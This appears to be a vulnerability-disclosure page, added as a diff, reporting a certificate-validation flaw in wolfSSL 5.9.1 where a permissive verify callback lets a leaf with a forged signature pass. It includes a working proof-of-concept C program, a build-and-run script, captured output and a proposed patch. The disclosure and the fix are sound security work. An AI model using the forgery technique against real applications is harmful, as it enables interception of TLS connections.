@@ -1,0 +1,644 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ANT-2026-K8YY7WWS · wolfssl/wolfssl</title>
+<link rel="icon" type="image/x-icon" href="/anthropic-serve/favicon.ico">
+<script>(function(){try{var t=localStorage.getItem("cvd_theme");if(t==="light"||t==="dark")document.documentElement.setAttribute("data-theme",t);}catch(e){}})();</script>
+<link rel="stylesheet" href="../assets/site.css">
+<link rel="stylesheet" href="../assets/ledger.css">
+</head>
+<body>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MT0111843S"></script><script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+  gtag('config', 'G-MT0111843S');
+</script>
+<main>
+<h1>ANT-2026-K8YY7WWS · wolfssl/wolfssl</h1>
+<nav class="site-nav muted">
+<a href="../index.html">Overview</a>  ·
+<a href="../ledger/index.html">Ledger</a>  ·
+<a href="../archive/index.html">Archive</a>  ·
+<a href="../about/index.html">About</a>  <span class="theme-toggle">
+    <button type="button" data-set-theme="light">Light</button>
+    <button type="button" data-set-theme="dark">Dark</button>
+    <button type="button" data-set-theme="system">System</button>
+  </span>
+</nav>
+<h2>
+  cert-validation
+  <span class="sev-badge sev-high">high</span>
+</h2>
+
+<p class="id-badges">
+  <a class="id-badge" href="https://nvd.nist.gov/vuln/detail/CVE-2026-5501">CVE-2026-5501</a>
+  <a class="id-badge" href="https://github.com/advisories/GHSA-hg75-4cmp-f367">GHSA-hg75-4cmp-f367</a>
+</p>
+
+<p class="sev-compare">
+  <span class="sev-compare-label">Severity</span>
+  <span class="sev-compare-item">Claude <span class="sev-chip sev-high">high</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Security research firm <span class="sev-chip sev-high">high</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Maintainer <span class="sev-chip sev-high">high</span></span>
+</p>
+
+<p class="attribution">Discovered by
+<span class="model-chip">Claude Mythos Preview</span></p>
+
+
+
+<div class="marker">SECURITY RESEARCH FIRM ANALYSIS</div>
+<p class="section-intro">Triage and disclosure were performed by Calif. The writeup below is the document the firm sent to the maintainer.</p>
+<dl class="vendor-analysis">
+<dt>Verdict</dt><dd><span class="verdict-chip verdict-tp">true positive</span></dd><dt>Severity</dt><dd class="sev-high">high</dd></dl>
+<div class="report-body" tabindex="0"><h1>ANT-2026-04591 — wolfSSL 5.9.1 <code>X509_verify_cert</code> verify_cb path still skips leaf signature</h1>
+<p>Incomplete fix of <strong>CVE-2026-5501</strong>. Commit <code>e5ab7fa74</code> (PR #10102, shipped in
+5.9.1) added a fail-closed <code>goto exit</code> to the <code>!isCa</code> branch when no
+<code>verify_cb</code> is registered, but when an application sets
+<code>X509_STORE_CTX_set_verify_cb</code> with a callback that returns <code>1</code> (the standard
+OpenSSL "collect all errors and continue" pattern), the
+<code>else { X509StoreVerifyCert(ctx) }</code> block at <code>src/x509_str.c:653-672</code> is still
+skipped. A leaf with a <strong>forged signature</strong> over a CA:FALSE intermediate is
+accepted with <code>ret=1</code>, and the callback is only ever shown
+<code>err=79 (X509_V_ERR_INVALID_CA)</code> — never <code>err=7 (CERT_SIGNATURE_FAILURE)</code>.
+OpenSSL on the identical chain with the identical callback surfaces err=79,
+err=32, <strong>and</strong> err=7, leaving <code>ctx-&gt;error=7</code>.</p>
+<h2>Quick start</h2>
+<pre tabindex="0"><code class="language-bash">./run_poc.sh             # clone v5.9.1-stable, build --enable-opensslall, run PoC
+./run_poc.sh --patched   # apply fix_ANT-2026-04591.patch, rebuild, re-run
+./run_poc.sh --skip-build
+</code></pre>
+<p>Expected (unpatched):</p>
+<pre tabindex="0"><code>  [cb] ok=0 err=79 -&gt; returning 1 (accept)
+[FORGED+cb] X509_verify_cert ret=1 ctx-&gt;error=79
+[+] VULNERABLE
+</code></pre>
+<p>Expected (<code>--patched</code>):</p>
+<pre tabindex="0"><code>  [cb] ok=0 err=79 -&gt; returning 1 (accept)
+  [cb] ok=0 err=7 -&gt; returning 1 (accept)
+[FORGED+cb] X509_verify_cert ret=1 ctx-&gt;error=7
+[+] PASS (patched)
+</code></pre>
+<h2>Files</h2>
+<table>
+<thead>
+<tr>
+<th>file</th>
+<th>purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>poc_ANT-2026-04591.c</code></td>
+<td>wolfSSL PoC: verify_cb returns 1, forged-sig leaf over CA:FALSE intermediate</td>
+</tr>
+<tr>
+<td><code>poc_ANT-2026-04591_openssl.c</code></td>
+<td>OpenSSL differential (same chain, same callback → surfaces err=7)</td>
+</tr>
+<tr>
+<td><code>poc_ANT-2026-04591_output.txt</code></td>
+<td>captured output before + after patch</td>
+</tr>
+<tr>
+<td><code>fix_ANT-2026-04591.patch</code></td>
+<td>proposed fix against v5.9.1-stable</td>
+</tr>
+<tr>
+<td><code>run_poc.sh</code></td>
+<td>one-command repro</td>
+</tr>
+</tbody>
+</table>
+<h2>Cert chain</h2>
+<p>Uses wolfSSL's own test corpus at
+<code>certs/intermediate/ca_false_intermediate/</code>: <code>test_ca.pem</code> (trusted root) →
+<code>test_int_not_cacert.pem</code> (CA:FALSE, legitimately signed by root) →
+<code>test_sign_bynoca_srv.pem</code> (leaf). The PoC corrupts ~90 bytes of the leaf's
+signature at runtime to produce the forgery.</p>
+<h2>Bug 2 — X509_verify_cert verify_cb Path Still Skips Leaf Signature (Incomplete Fix of CVE-2026-5501)</h2>
+<p><strong>ANT-2026-04591</strong> · CVSS 3.1 <strong>7.4 HIGH</strong> · <code>AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N</code></p>
+<h3>Summary</h3>
+<p>Commit <a href="https://github.com/wolfSSL/wolfssl/commit/e5ab7fa7457d82294bafcfb6c103a9e79b4aa213"><code>e5ab7fa74</code></a> (PR #10102) fixed the as-reported CVE-2026-5501 default path by adding a fail-closed <code>goto exit</code> to the <code>!isCa</code> branch when <code>verify_cb == NULL</code> (<a href="https://github.com/wolfSSL/wolfssl/blob/v5.9.1-stable/src/x509_str.c#L647-L650">x509_str.c:647-650</a>). But when <code>verify_cb</code> returns <code>1</code> for <code>X509_V_ERR_INVALID_CA</code> — the standard OpenSSL "collect all errors" pattern used by Qt's <code>QSslSocket</code>, curl-style certificate-error reporting, and certificate-pinning libraries — control exits the <code>if (!issuer-&gt;isCa)</code> block at <a href="https://github.com/wolfSSL/wolfssl/blob/v5.9.1-stable/src/x509_str.c#L640-L651">x509_str.c:640-651</a> and the <code>else { X509StoreVerifyCert(ctx); }</code> block at <a href="https://github.com/wolfSSL/wolfssl/blob/v5.9.1-stable/src/x509_str.c#L653-L672">x509_str.c:653-672</a> is <strong>still skipped</strong>. A leaf with garbage signature bytes is accepted with <code>ret=1, ctx-&gt;error=79</code>, and the callback only ever sees <code>err=79</code> — never <code>err=7 (CERT_SIGNATURE_FAILURE)</code>. OpenSSL 3.0 on the identical chain surfaces <code>err=79</code>, <code>err=32</code>, <strong>and</strong> <code>err=7</code>, leaving <code>ctx-&gt;error=7</code>.</p>
+<h3>Reproduce</h3>
+<pre tabindex="0"><code class="language-bash">cd 02_ANT-2026-04591_x509-verifycb-leaf-sig &amp;&amp; ./run_poc.sh
+</code></pre>
+<p><strong>wolfSSL 5.9.1:</strong></p>
+<pre tabindex="0"><code>  [cb] ok=0 err=79 -&gt; returning 1 (accept)
+[FORGED+cb] X509_verify_cert ret=1 ctx-&gt;error=79
+[FORGED+cb] callback saw: err79(INVALID_CA)=yes  err7(CERT_SIGNATURE_FAILURE)=NO
+[FORGED+cb] *** VULNERABLE ***
+</code></pre>
+<p><strong>OpenSSL 3.0.18 (same chain, same callback):</strong></p>
+<pre tabindex="0"><code>  [cb] ok=0 err=79 -&gt; returning 1
+  [cb] ok=0 err=32 -&gt; returning 1
+  [cb] ok=0 err=7 (certificate signature failure) -&gt; returning 1
+[FORGED+cb] X509_verify_cert ret=1 ctx-&gt;error=7
+</code></pre>
+<p><strong>Affected:</strong> wolfSSL 5.9.0–5.9.1 with <code>--enable-opensslall</code> (or <code>WOLFSSL_QT</code>, <code>--enable-qt</code>, <code>--enable-nginx</code>, <code>--enable-haproxy</code>, <code>--enable-all</code>); application installs <code>X509_STORE_CTX_set_verify_cb</code> returning <code>1</code> for <code>INVALID_CA</code>. Native TLS handshake (<code>ProcessPeerCerts</code>) is unaffected.</p>
+<h3>Patch</h3>
+<p>Drop the <code>else</code> so the override case falls through to <code>X509StoreVerifyCert</code>:</p>
+<pre tabindex="0"><code class="language-diff">--- a/src/x509_str.c
++++ b/src/x509_str.c
+@@ -643,12 +643,16 @@ int wolfSSL_X509_verify_cert(WOLFSSL_X509_STORE_CTX* ctx)
+                         ret = WOLFSSL_FAILURE;
+                         goto exit;
+                     }
++                    /* verify_cb accepted X509_V_ERR_INVALID_CA: fall through
++                     * to the normal AddCa + X509StoreVerifyCert path so the
++                     * leaf's signature is still checked and any signature
++                     * failure is surfaced to the callback (OpenSSL parity). */
+                 }
+                 else {
+                     ret = WOLFSSL_FAILURE;
+                     goto exit;
+                 }
+-            } else
++            }
+         #endif
+             {
+                 ret = X509StoreAddCa(ctx-&gt;store, issuer,
+</code></pre>
+<blockquote>
+<p><strong>Verified:</strong> callback now sees <code>err=79</code> and <code>err=7</code>; <code>ctx-&gt;error=7</code> (OpenSSL parity). No-callback path still rejects <code>ret=0, ctx-&gt;error=79</code> (no regression of e5ab7fa74).</p>
+</blockquote>
+<h2>Attachment: <code>02_ANT-2026-04591_x509-verifycb-leaf-sig/fix_ANT-2026-04591.patch</code></h2>
+<pre tabindex="0"><code>diff --git a/src/x509_str.c b/src/x509_str.c
+index 90113caed..a1f2e3c4d 100644
+--- a/src/x509_str.c
++++ b/src/x509_str.c
+@@ -643,12 +643,16 @@ int wolfSSL_X509_verify_cert(WOLFSSL_X509_STORE_CTX* ctx)
+                         ret = WOLFSSL_FAILURE;
+                         goto exit;
+                     }
++                    /* verify_cb accepted X509_V_ERR_INVALID_CA: fall through
++                     * to the normal AddCa + X509StoreVerifyCert path so the
++                     * leaf's signature is still checked and any signature
++                     * failure is surfaced to the callback (OpenSSL parity). */
+                 }
+                 else {
+                     ret = WOLFSSL_FAILURE;
+                     goto exit;
+                 }
+-            } else
++            }
+         #endif
+             {
+                 ret = X509StoreAddCa(ctx-&gt;store, issuer,
+</code></pre>
+<h2>Attachment: <code>02_ANT-2026-04591_x509-verifycb-leaf-sig/poc_ANT-2026-04591.c</code></h2>
+<pre tabindex="0"><code>/* ANT-2026-04591 — wolfSSL 5.9.1 X509_verify_cert: verify_cb path still skips
+ * leaf signature verification (incomplete fix of CVE-2026-5501).
+ *
+ * CVE-2026-5501 was fixed in 5.9.1 commit e5ab7fa74 by adding a fail-closed
+ * `goto exit` to the `!isCa` branch when `verify_cb == NULL`. But when an
+ * application registers a verify_cb that returns 1 (the standard OpenSSL
+ * &quot;override this error and continue collecting&quot; pattern — used by Qt,
+ * curl-style cert error reporting, cert-pinning libs), the
+ * `else { X509StoreAddCa(); X509StoreVerifyCert(ctx); }` block at
+ * src/x509_str.c:653-672 is STILL skipped, so the leaf's signature is never
+ * fed to wolfSSL_CertManagerVerifyBuffer.
+ *
+ * Result: a leaf with garbage signature bytes is accepted with ret=1, and
+ * the callback is only ever shown err=79 (X509_V_ERR_INVALID_CA) — never
+ * err=7 (X509_V_ERR_CERT_SIGNATURE_FAILURE). OpenSSL on the identical chain
+ * with the identical callback surfaces err=79, err=32 AND err=7.
+ *
+ * Chain: trusted root -&gt; CA:FALSE intermediate (legit sig) -&gt; forged leaf.
+ * Uses wolfSSL's own test corpus: certs/intermediate/ca_false_intermediate/
+ */
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+#include &lt;wolfssl/options.h&gt;
+#include &lt;wolfssl/ssl.h&gt;
+#include &lt;wolfssl/openssl/ssl.h&gt;
+#include &lt;wolfssl/openssl/x509.h&gt;
+#include &lt;wolfssl/openssl/x509_vfy.h&gt;
+
+#ifndef CERTS_DIR
+#define CERTS_DIR &quot;certs/intermediate/ca_false_intermediate&quot;
+#endif
+
+static int seen_err7  = 0;   /* X509_V_ERR_CERT_SIGNATURE_FAILURE */
+static int seen_err79 = 0;   /* X509_V_ERR_INVALID_CA */
+static int last_err   = 0;
+
+/* The standard &quot;collect all errors, return 1&quot; callback pattern. */
+static int cb_accept_all(int ok, WOLFSSL_X509_STORE_CTX *ctx) {
+    int e = wolfSSL_X509_STORE_CTX_get_error(ctx);
+    if (!ok) {
+        last_err = e;
+        if (e == 7)  seen_err7  = 1;
+        if (e == 79) seen_err79 = 1;
+        printf(&quot;  [cb] ok=%d err=%d -&gt; returning 1 (accept)\n&quot;, ok, e);
+    }
+    return 1;
+}
+
+static WOLFSSL_X509 *load_pem(const char *p) {
+    WOLFSSL_X509 *x = wolfSSL_X509_load_certificate_file(p, SSL_FILETYPE_PEM);
+    if (!x) fprintf(stderr, &quot;  ! failed to load %s\n&quot;, p);
+    return x;
+}
+
+int main(void) {
+    wolfSSL_Init();
+    printf(&quot;=== ANT-2026-04591: wolfSSL X509_verify_cert verify_cb path &quot;
+           &quot;(incomplete fix of CVE-2026-5501) ===\n&quot;);
+    printf(&quot;wolfSSL version: %s\n\n&quot;, wolfSSL_lib_version());
+
+    WOLFSSL_X509 *root   = load_pem(CERTS_DIR &quot;/test_ca.pem&quot;);
+    WOLFSSL_X509 *interm = load_pem(CERTS_DIR &quot;/test_int_not_cacert.pem&quot;);
+    WOLFSSL_X509 *leaf   = load_pem(CERTS_DIR &quot;/test_sign_bynoca_srv.pem&quot;);
+    if (!root || !interm || !leaf) return 2;
+
+    /* Forge: corrupt the leaf's signature bytes (XOR ~90 bytes near the end). */
+    int derSz = 0;
+    const unsigned char *der = wolfSSL_X509_get_der(leaf, &amp;derSz);
+    unsigned char *fd = malloc((size_t)derSz);
+    memcpy(fd, der, (size_t)derSz);
+    for (int i = derSz - 100; i &lt; derSz - 10; i++) fd[i] ^= 0xFF;
+    const unsigned char *p = fd;
+    WOLFSSL_X509 *forged = wolfSSL_d2i_X509(NULL, &amp;p, derSz);
+    if (!forged) { fprintf(stderr, &quot;d2i forged fail\n&quot;); return 2; }
+
+    /* Build store: trust root, set verify_cb, supply CA:FALSE interm as
+     * untrusted, verify the forged-signature leaf. */
+    WOLFSSL_X509_STORE     *store = wolfSSL_X509_STORE_new();
+    WOLFSSL_X509_STORE_CTX *ctx   = wolfSSL_X509_STORE_CTX_new();
+    WOLF_STACK_OF(WOLFSSL_X509) *un = wolfSSL_sk_X509_new_null();
+
+    wolfSSL_X509_STORE_add_cert(store, root);
+    wolfSSL_X509_STORE_set_verify_cb(store, cb_accept_all);
+    wolfSSL_sk_X509_push(un, interm);
+    wolfSSL_X509_STORE_CTX_init(ctx, store, forged, un);
+
+    int ret = wolfSSL_X509_verify_cert(ctx);
+    int err = wolfSSL_X509_STORE_CTX_get_error(ctx);
+
+    printf(&quot;\n[FORGED+cb] X509_verify_cert ret=%d ctx-&gt;error=%d\n&quot;, ret, err);
+    printf(&quot;[FORGED+cb] callback saw: err79(INVALID_CA)=%s  &quot;
+           &quot;err7(CERT_SIGNATURE_FAILURE)=%s\n&quot;,
+           seen_err79 ? &quot;yes&quot; : &quot;no&quot;, seen_err7 ? &quot;yes&quot; : &quot;NO&quot;);
+
+    int rc;
+    if (ret == WOLFSSL_SUCCESS &amp;&amp; !seen_err7) {
+        printf(&quot;\n[FORGED+cb] *** VULNERABLE ***\n&quot;);
+        printf(&quot;[FORGED+cb] ret=SUCCESS for a forged-signature leaf; callback &quot;
+               &quot;was never shown err=7.\n&quot;);
+        printf(&quot;[FORGED+cb] (verify_cb=1 path at src/x509_str.c:640-651 still &quot;
+               &quot;skips X509StoreVerifyCert)\n&quot;);
+        rc = 0;
+    } else if (seen_err7) {
+        printf(&quot;\n[FORGED+cb] FIXED: callback was shown err=7 &quot;
+               &quot;(CERT_SIGNATURE_FAILURE) — leaf signature was checked.\n&quot;);
+        rc = 1;
+    } else {
+        printf(&quot;\n[FORGED+cb] rejected (ret=%d) without surfacing err=7\n&quot;, ret);
+        rc = 1;
+    }
+
+    wolfSSL_X509_STORE_CTX_free(ctx);
+    wolfSSL_X509_STORE_free(store);
+    wolfSSL_sk_X509_free(un);
+    wolfSSL_X509_free(forged);
+    wolfSSL_X509_free(root);
+    wolfSSL_X509_free(interm);
+    wolfSSL_X509_free(leaf);
+    free(fd);
+    wolfSSL_Cleanup();
+    return rc;
+}
+</code></pre>
+<h2>Attachment: <code>02_ANT-2026-04591_x509-verifycb-leaf-sig/poc_ANT-2026-04591_openssl.c</code></h2>
+<pre tabindex="0"><code>/* ANT-2026-04591 — OpenSSL differential for the verify_cb-returns-1 path.
+ *
+ * Same chain (trusted root -&gt; CA:FALSE intermediate -&gt; forged-sig leaf),
+ * same callback (returns 1 for every error). OpenSSL surfaces:
+ *   err=79 (invalid CA certificate)
+ *   err=32 (key usage does not include certificate signing)
+ *   err=7  (certificate signature failure)
+ * and leaves ctx-&gt;error = 7. wolfSSL 5.9.1 surfaces only err=79.
+ */
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;openssl/x509.h&gt;
+#include &lt;openssl/x509_vfy.h&gt;
+#include &lt;openssl/pem.h&gt;
+
+#ifndef CERTS_DIR
+#define CERTS_DIR &quot;certs/intermediate/ca_false_intermediate&quot;
+#endif
+
+static int cb_accept_all(int ok, X509_STORE_CTX *ctx) {
+    int e = X509_STORE_CTX_get_error(ctx);
+    if (!ok) printf(&quot;  [cb] ok=%d err=%d (%s) -&gt; returning 1\n&quot;, ok, e,
+                    X509_verify_cert_error_string(e));
+    return 1;
+}
+
+static X509 *load_pem(const char *p) {
+    FILE *f = fopen(p, &quot;r&quot;);
+    if (!f) return NULL;
+    X509 *x = PEM_read_X509(f, NULL, NULL, NULL);
+    fclose(f);
+    return x;
+}
+
+int main(void) {
+    printf(&quot;=== ANT-2026-04591: OpenSSL differential, %s ===\n\n&quot;,
+           OPENSSL_VERSION_TEXT);
+    X509 *root   = load_pem(CERTS_DIR &quot;/test_ca.pem&quot;);
+    X509 *interm = load_pem(CERTS_DIR &quot;/test_int_not_cacert.pem&quot;);
+    X509 *leaf   = load_pem(CERTS_DIR &quot;/test_sign_bynoca_srv.pem&quot;);
+    if (!root || !interm || !leaf) { printf(&quot;load fail\n&quot;); return 2; }
+
+    int derSz = i2d_X509(leaf, NULL);
+    unsigned char *fd = malloc((size_t)derSz), *pp = fd;
+    i2d_X509(leaf, &amp;pp);
+    for (int i = derSz - 100; i &lt; derSz - 10; i++) fd[i] ^= 0xFF;
+    const unsigned char *p = fd;
+    X509 *forged = d2i_X509(NULL, &amp;p, derSz);
+    if (!forged) { printf(&quot;d2i forged fail\n&quot;); return 2; }
+
+    X509_STORE     *store = X509_STORE_new();
+    X509_STORE_CTX *ctx   = X509_STORE_CTX_new();
+    STACK_OF(X509) *un    = sk_X509_new_null();
+    X509_STORE_add_cert(store, root);
+    X509_STORE_set_verify_cb(store, cb_accept_all);
+    sk_X509_push(un, interm);
+    X509_STORE_CTX_init(ctx, store, forged, un);
+
+    int ret = X509_verify_cert(ctx);
+    int err = X509_STORE_CTX_get_error(ctx);
+    printf(&quot;\n[FORGED+cb] X509_verify_cert ret=%d ctx-&gt;error=%d (%s)\n&quot;,
+           ret, err, X509_verify_cert_error_string(err));
+    return 0;
+}
+</code></pre>
+<h2>Attachment: <code>02_ANT-2026-04591_x509-verifycb-leaf-sig/poc_ANT-2026-04591_output.txt</code></h2>
+<pre tabindex="0"><code>=== BEFORE PATCH (wolfSSL v5.9.1-stable @ 1d363f3a, --enable-opensslall) ===
+
+=== ANT-2026-04591: wolfSSL X509_verify_cert verify_cb path (incomplete fix of CVE-2026-5501) ===
+wolfSSL version: 5.9.1
+
+  [cb] ok=0 err=79 -&gt; returning 1 (accept)
+
+[FORGED+cb] X509_verify_cert ret=1 ctx-&gt;error=79
+[FORGED+cb] callback saw: err79(INVALID_CA)=yes  err7(CERT_SIGNATURE_FAILURE)=NO
+
+[FORGED+cb] *** VULNERABLE ***
+[FORGED+cb] ret=SUCCESS for a forged-signature leaf; callback was never shown err=7.
+[FORGED+cb] (verify_cb=1 path at src/x509_str.c:640-651 still skips X509StoreVerifyCert)
+
+--- OpenSSL differential (same chain, same callback) ---
+
+=== ANT-2026-04591: OpenSSL differential, OpenSSL 3.0.18 30 Sep 2025 ===
+
+  [cb] ok=0 err=79 (invalid CA certificate) -&gt; returning 1
+  [cb] ok=0 err=32 (key usage does not include certificate signing) -&gt; returning 1
+  [cb] ok=0 err=7 (certificate signature failure) -&gt; returning 1
+
+[FORGED+cb] X509_verify_cert ret=1 ctx-&gt;error=7 (certificate signature failure)
+
+
+=== AFTER PATCH (fix_ANT-2026-04591.patch applied) ===
+
+=== ANT-2026-04591: wolfSSL X509_verify_cert verify_cb path (incomplete fix of CVE-2026-5501) ===
+wolfSSL version: 5.9.1
+
+  [cb] ok=0 err=79 -&gt; returning 1 (accept)
+  [cb] ok=0 err=7 -&gt; returning 1 (accept)
+
+[FORGED+cb] X509_verify_cert ret=1 ctx-&gt;error=7
+[FORGED+cb] callback saw: err79(INVALID_CA)=yes  err7(CERT_SIGNATURE_FAILURE)=yes
+
+[FORGED+cb] FIXED: callback was shown err=7 (CERT_SIGNATURE_FAILURE) — leaf signature was checked.
+</code></pre>
+<h2>Attachment: <code>02_ANT-2026-04591_x509-verifycb-leaf-sig/run_poc.sh</code></h2>
+<pre tabindex="0"><code>#!/usr/bin/env bash
+# ANT-2026-04591 — wolfSSL 5.9.1 X509_verify_cert: verify_cb path still skips
+# leaf signature verification (incomplete fix of CVE-2026-5501)
+#
+# Usage:
+#   ./run_poc.sh              # clone v5.9.1-stable, build --enable-opensslall, run PoC
+#   ./run_poc.sh --patched    # apply fix_ANT-2026-04591.patch, rebuild, re-run
+#   ./run_poc.sh --skip-build # reuse existing build
+set -euo pipefail
+HERE=&quot;$(cd &quot;$(dirname &quot;${BASH_SOURCE[0]}&quot;)&quot; &amp;&amp; pwd)&quot;
+cd &quot;$HERE&quot;
+
+WOLFSSL_TAG=v5.9.1-stable
+WOLFSSL_SHA=1d363f3adceba9d1478230ede476a37b0dcdef24
+SRC=&quot;$HERE/wolfssl-5.9.1&quot;
+PATCH=&quot;$HERE/fix_ANT-2026-04591.patch&quot;
+POC_SRC=&quot;$HERE/poc_ANT-2026-04591.c&quot;
+POC_BIN=&quot;$HERE/poc_ANT-2026-04591&quot;
+PATCH_MARKER='verify_cb accepted X509_V_ERR_INVALID_CA'
+
+PATCHED=0
+SKIP_BUILD=0
+for a in &quot;$@&quot;; do
+  case &quot;$a&quot; in
+    --patched)    PATCHED=1 ;;
+    --skip-build) SKIP_BUILD=1 ;;
+    *) echo &quot;unknown arg: $a&quot;; exit 2 ;;
+  esac
+done
+
+cleanup() {
+  if [[ -d &quot;$SRC&quot; ]] &amp;&amp; grep -q &quot;$PATCH_MARKER&quot; &quot;$SRC/src/x509_str.c&quot; 2&gt;/dev/null; then
+    ( cd &quot;$SRC&quot; &amp;&amp; patch -R -p1 -s &lt; &quot;$PATCH&quot; ) || true
+    rm -f &quot;$SRC/src/.libs/libwolfssl_la-ssl.lo&quot; &quot;$SRC/src/.libs/libwolfssl.a&quot; 2&gt;/dev/null
+  fi
+}
+trap cleanup EXIT
+
+# ── 0. download ────────────────────────────────────────────────────────────────
+if [[ ! -d &quot;$SRC&quot; ]]; then
+  echo &quot;[*] cloning wolfSSL $WOLFSSL_TAG (~2 min)...&quot;
+  git clone --filter=blob:none --no-checkout https://github.com/wolfSSL/wolfssl.git &quot;$SRC&quot;
+  ( cd &quot;$SRC&quot; &amp;&amp; git checkout &quot;$WOLFSSL_SHA&quot; )
+fi
+
+# ── 1. build ───────────────────────────────────────────────────────────────────
+if [[ &quot;$SKIP_BUILD&quot; -eq 0 &amp;&amp; ! -f &quot;$SRC/src/.libs/libwolfssl.a&quot; ]]; then
+  echo &quot;[*] building wolfSSL --enable-opensslall (~5 min first run)...&quot;
+  ( cd &quot;$SRC&quot;
+    ./autogen.sh
+    ./configure --enable-opensslall --enable-static --disable-shared \
+        --disable-jobserver
+    make -j&quot;$(nproc)&quot;
+  ) &gt; build.log 2&gt;&amp;1 || { tail -50 build.log; exit 1; }
+elif [[ &quot;$SKIP_BUILD&quot; -eq 1 &amp;&amp; ! -f &quot;$SRC/src/.libs/libwolfssl.a&quot; ]]; then
+  echo &quot;[-] --skip-build but no build present; run without --skip-build first&quot;
+  exit 1
+fi
+
+# Cert chain: wolfSSL ships the CA:FALSE-intermediate test corpus we need.
+#   certs/intermediate/ca_false_intermediate/test_ca.pem               (trusted root)
+#   certs/intermediate/ca_false_intermediate/test_int_not_cacert.pem   (CA:FALSE, signed by root)
+#   certs/intermediate/ca_false_intermediate/test_sign_bynoca_srv.pem  (leaf)
+# The PoC corrupts the leaf's signature bytes at runtime to produce the forgery.
+for f in test_ca.pem test_int_not_cacert.pem test_sign_bynoca_srv.pem; do
+  if [[ ! -f &quot;$SRC/certs/intermediate/ca_false_intermediate/$f&quot; ]]; then
+    echo &quot;[-] missing test cert: $f&quot;; exit 1
+  fi
+done
+
+# ── patch / unpatch ────────────────────────────────────────────────────────────
+if [[ &quot;$PATCHED&quot; -eq 1 ]]; then
+  if ! grep -q &quot;$PATCH_MARKER&quot; &quot;$SRC/src/x509_str.c&quot;; then
+    echo &quot;[*] applying $PATCH&quot;
+    ( cd &quot;$SRC&quot; &amp;&amp; patch -p1 -s &lt; &quot;$PATCH&quot; )
+    rm -f &quot;$SRC/src/.libs/libwolfssl_la-ssl.lo&quot; &quot;$SRC/src/.libs/libwolfssl.a&quot;
+  fi
+else
+  if grep -q &quot;$PATCH_MARKER&quot; &quot;$SRC/src/x509_str.c&quot;; then
+    echo &quot;[*] reverting patch&quot;
+    ( cd &quot;$SRC&quot; &amp;&amp; patch -R -p1 -s &lt; &quot;$PATCH&quot; )
+    rm -f &quot;$SRC/src/.libs/libwolfssl_la-ssl.lo&quot; &quot;$SRC/src/.libs/libwolfssl.a&quot;
+  fi
+fi
+if [[ ! -f &quot;$SRC/src/.libs/libwolfssl.a&quot; ]]; then
+  echo &quot;[*] rebuilding src/x509_str.c ...&quot;
+  ( cd &quot;$SRC&quot; &amp;&amp; make -j&quot;$(nproc)&quot; src/libwolfssl.la ) &gt; rebuild.log 2&gt;&amp;1 \
+    || { tail -30 rebuild.log; exit 1; }
+fi
+
+# ── 2. compile PoC ────────────────────────────────────────────────────────────
+echo &quot;[*] compiling PoC against $( [[ $PATCHED -eq 1 ]] &amp;&amp; echo patched || echo unpatched ) libwolfssl.a&quot;
+gcc -I&quot;$SRC&quot; -o &quot;$POC_BIN&quot; &quot;$POC_SRC&quot; &quot;$SRC/src/.libs/libwolfssl.a&quot; -lm -lpthread
+
+# ── 3. run ────────────────────────────────────────────────────────────────────
+echo &quot;[*] running PoC (forged-signature leaf over CA:FALSE intermediate, verify_cb returns 1)&quot;
+echo
+OUT=$( cd &quot;$SRC&quot; &amp;&amp; &quot;$POC_BIN&quot; 2&gt;&amp;1 ) || true
+echo &quot;$OUT&quot;
+echo
+
+# Optional OpenSSL differential
+if [[ -f &quot;$HERE/poc_ANT-2026-04591_openssl.c&quot; ]] &amp;&amp; command -v openssl &gt;/dev/null; then
+  gcc -o &quot;$HERE/poc_ANT-2026-04591_openssl&quot; &quot;$HERE/poc_ANT-2026-04591_openssl.c&quot; \
+      -lssl -lcrypto 2&gt;/dev/null &amp;&amp; {
+    echo &quot;--- OpenSSL differential (same chain, same callback) ---&quot;
+    ( cd &quot;$SRC&quot; &amp;&amp; &quot;$HERE/poc_ANT-2026-04591_openssl&quot; 2&gt;&amp;1 ) || true
+    echo
+  }
+fi
+
+# ── 4. verdict ────────────────────────────────────────────────────────────────
+echo &quot;──────────────────────────────────────────────────────────────────────────&quot;
+SAW7=0;  echo &quot;$OUT&quot; | grep -qE '\[cb\].*err=7\b' &amp;&amp; SAW7=1
+RET1=0;  echo &quot;$OUT&quot; | grep -q  'X509_verify_cert ret=1' &amp;&amp; RET1=1
+
+if [[ &quot;$PATCHED&quot; -eq 1 ]]; then
+  if [[ &quot;$SAW7&quot; -eq 1 ]] &amp;&amp; echo &quot;$OUT&quot; | grep -q 'ctx-&gt;error=7'; then
+    echo &quot;[+] PASS (patched): callback saw err=7 (CERT_SIGNATURE_FAILURE), ctx-&gt;error=7&quot;
+    echo &quot;    — matches OpenSSL semantics; leaf signature is now verified.&quot;
+    exit 0
+  else
+    echo &quot;[-] FAIL: patch applied but err=7 not surfaced to callback&quot;
+    exit 1
+  fi
+else
+  if [[ &quot;$RET1&quot; -eq 1 &amp;&amp; &quot;$SAW7&quot; -eq 0 ]]; then
+    echo &quot;[+] VULNERABLE: X509_verify_cert ret=1 for forged-signature leaf;&quot;
+    echo &quot;    callback only saw err=79 (INVALID_CA) — err=7 (CERT_SIGNATURE_FAILURE)&quot;
+    echo &quot;    was NEVER surfaced. verify_cb=1 path skips X509StoreVerifyCert&quot;
+    echo &quot;    at src/x509_str.c:651-672 (incomplete fix of CVE-2026-5501).&quot;
+    exit 0
+  else
+    echo &quot;[-] FAIL: expected ret=1 with no err=7; got SAW7=$SAW7 RET1=$RET1&quot;
+    exit 1
+  fi
+fi
+</code></pre></div>
+
+
+
+
+
+<div class="marker">TIMELINE</div>
+<p class="section-intro">Recorded dates, in order.</p>
+<div class="figure">
+  <ol class="timeline">
+    <li class="timeline-pt">
